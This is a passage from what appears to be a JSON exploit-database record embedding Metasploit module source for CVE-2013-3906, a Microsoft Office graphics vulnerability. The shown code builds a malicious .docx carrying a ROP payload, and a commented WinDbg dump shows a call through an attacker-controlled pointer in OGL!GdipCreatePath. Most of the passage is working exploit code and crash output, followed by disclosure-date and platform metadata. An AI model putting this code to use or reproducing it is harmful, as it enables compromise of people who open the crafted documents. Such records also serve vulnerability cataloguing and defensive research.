#{doc_xml_reals_file[:fname]}\")\n    zip.add_file(doc_xml_reals_file[:fname], doc_xml_reals_file[:data])\n\n    zip.pack\n  end\n\n  def exploit\n    @rop_payload = get_rop_payload\n    @schema = \"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-3906\")\n    docx = make_docx(path)\n    file_create(docx)\n  end\nend\n\n=begin\n\n0:000> r\neax=414242f4 ebx=00000000 ecx=22a962a0 edx=44191398 esi=22c4d338 edi=1cfe5dc0\neip=44023a2a esp=0011fd8c ebp=0011fd98 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286\nOGL!GdipCreatePath+0x58:\n44023a2a ff5050          call    dword ptr [eax+50h]  ds:0023:41424344=????????\n0:000> k\nChildEBP RetAddr\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0011fd98 437a9681 OGL!GdipCreatePath+0x58\n0011fdc8 437b11b0 gfx+0x9681\n0011fdf0 422b56e5 gfx+0x111b0\n0011fe18 422a99f7 oart!Ordinal3584+0x86\n0011fed8 422a9921 oart!Ordinal7649+0x2b2\n0011fef0 422a8676 oart!Ordinal7649+0x1dc\n001200bc 422a85a8 oart!Ordinal4145+0x199\n001200fc 424898c6 oart!Ordinal4145+0xcb\n001201bc 42489b56 oart!Ordinal3146+0xb15\n001202cc 422a37df oart!Ordinal3146+0xda5\n00120330 422a2a73 oart!Ordinal2862+0x14e\n00120360 317821a9 oart!Ordinal2458+0x5e\n001203bc 31782110 wwlib!GetAllocCounters+0x9bd51\n001204a4 3177d1f2 wwlib!GetAllocCounters+0x9bcb8\n001207ec 3177caef wwlib!GetAllocCounters+0x96d9a\n0012088c 3177c7a0 wwlib!GetAllocCounters+0x96697\n001209b0 3175ab83 wwlib!GetAllocCounters+0x96348\n001209d4 317569e0 wwlib!GetAllocCounters+0x7472b\n00120ad4 317540f5 wwlib!GetAllocCounters+0x70588\n00120afc 3175400b wwlib!GetAllocCounters+0x6dc9d\n\n  To-do:\n  Turn the docx packaging into a mixin. Good luck with that.\n\n=end\n",
    "x_mitre_disclosure_date": "2013-11-05, # Microsoft announcement",
    "x_mitre_platforms": [
        "win'"
    ]
}